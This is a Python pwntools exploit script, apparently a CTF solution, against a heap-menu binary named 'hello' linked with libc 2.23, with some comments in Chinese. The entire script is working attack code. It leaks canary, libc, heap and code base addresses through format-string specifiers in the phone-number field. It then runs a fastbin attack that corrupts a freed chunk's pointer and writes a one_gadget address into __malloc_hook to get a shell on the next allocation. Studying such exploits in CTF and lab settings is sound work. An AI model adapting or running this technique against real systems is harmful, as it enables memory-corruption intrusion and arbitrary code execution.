#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'

libc = ELF('./libc-2.23.so')
elf = ELF('./hello')

DEBUG = 1
if DEBUG:
	p = process('./hello')
else:
	p = remote('', 66666)

def debug():
	gdb.attach(p)
	pause()

def pr(addr_name, addr):
	log.success(addr_name + ': ' + hex(addr))

def add(length,name,content):
	p.sendlineafter('>>','1')
	p.sendlineafter('phone number:','%p.%p.%p..')
	p.sendlineafter('name:',name)
	p.sendlineafter('input des size:',str(length))
	p.sendlineafter('des info:',content)

def delete(idx):
	p.sendlineafter('>>','2')
	p.sendlineafter('input index:',str(idx))
	p.recvuntil('delete sucess!\n')

def edit(idx,name,content):
	p.sendlineafter('>>','4')
	p.sendlineafter('input index:',str(idx))
	p.sendlineafter('phone number:','a'*0xa)
	p.sendlineafter('name:',name)
	p.sendafter('des info:',content)

def show(idx):
	p.sendlineafter('>>','3')
	p.sendlineafter('input index:',str(idx))
	p.recvuntil('number:')

add(0x60,'1'*13,'1') #0

show(0)
canary = int(p.recv(14),16)+0x2698
p.recv(7)
libcbase = int(p.recv(14),16)-0xf73c0
p.recvuntil('1'*13)
heapbase = u64(p.recv(6).ljust(8,"\x00"))-0x10

__malloc_hook = libcbase + libc.sym['__malloc_hook']
_IO_2_1_stdin_ = libcbase + 0x3c48e0
og = libcbase + [0x4527a,0xf03a4,0xf1247][2]
pr('stack',canary)
pr('heapbase',heapbase)
pr('libcbase',libcbase)
pr('__malloc_hook',__malloc_hook)
pr('_IO_2_1_stdin_',_IO_2_1_stdin_)

myformat = '%9$p'
p.sendlineafter('>>','1')
p.sendlineafter('phone number:',myformat)
p.sendlineafter('name:','2'*12)
p.sendlineafter('input des size:',str(0x60))
p.sendlineafter('des info:','2')

show(1)
codebase = int(p.recv(14),16)-0x1274
idx_addr = codebase + 0x2020BC
pr('codebase',codebase)
pr('idx_addr',idx_addr)

delete(0)
edit(1,'2'*13+p64(heapbase+0x10),p64(idx_addr-0x1f))

add(0x60,'3'*12,'3') #2 use chunk0
add(0x60,'4'*12,'4') #3 分配到 idx_addr-0x1f

#保证输入流指针 _IO_2_1_stdin_ 没有被修改
payload = '\x34\x00\x00' + p64(_IO_2_1_stdin_) + '\x00'*4 + '\x00' #把 4 修改为 0
edit(3,'4'*12,payload)

delete(2)

edit(1,'2'*13+p64(heapbase+0x10),p64(__malloc_hook-0x23))
add(0x60,'5'*12,'5') #0 use chunk0
add(0x60,'6'*12,'6') #1 分配到__malloc_hook-0x23

#debug()
edit(1,'6'*12,'\x00'*0x13+p64(og)) #__malloc_hook写入one_gadget
#debug()

p.sendlineafter('>>','1')
p.sendlineafter('phone number:','11')
p.sendlineafter('name:','11')
p.sendlineafter('input des size:',str(0x60)) #申请 chunk 的时候可以 getshell

p.interactive()